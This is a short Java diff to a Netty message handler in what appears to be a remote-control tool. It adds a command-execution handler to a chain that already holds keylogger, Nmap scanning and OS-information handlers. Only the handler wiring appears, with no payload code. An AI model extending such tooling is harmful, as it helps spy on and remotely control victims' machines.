@@ -1,10 +1,7 @@
 package netty.Handler;
 
 import Config.Config;
-import RequestHandler.KeyLoggerHandler;
-import RequestHandler.MyRequestHanlder;
-import RequestHandler.NmapHandler;
-import RequestHandler.OsInfoHandler;
+import RequestHandler.*;
 import com.google.gson.Gson;
 import io.netty.channel.ChannelHandler;
 import io.netty.channel.ChannelHandlerContext;
@@ -54,8 +51,10 @@ public class MesgHandler extends SimpleChannelInboundHandler<String> {
             KeyLoggerHandler keyLoggerHandler = new KeyLoggerHandler();
             NmapHandler nmapHandler = new NmapHandler();
             OsInfoHandler osInfoHandler = new OsInfoHandler();
+            CmdHandler cmdHandler = new CmdHandler();
             keyLoggerHandler.successor = nmapHandler;
             nmapHandler.successor = osInfoHandler;
+            osInfoHandler.successor = cmdHandler;
             keyLoggerHandler.handlerRequest(socketInfo, ctx);
         }
     }
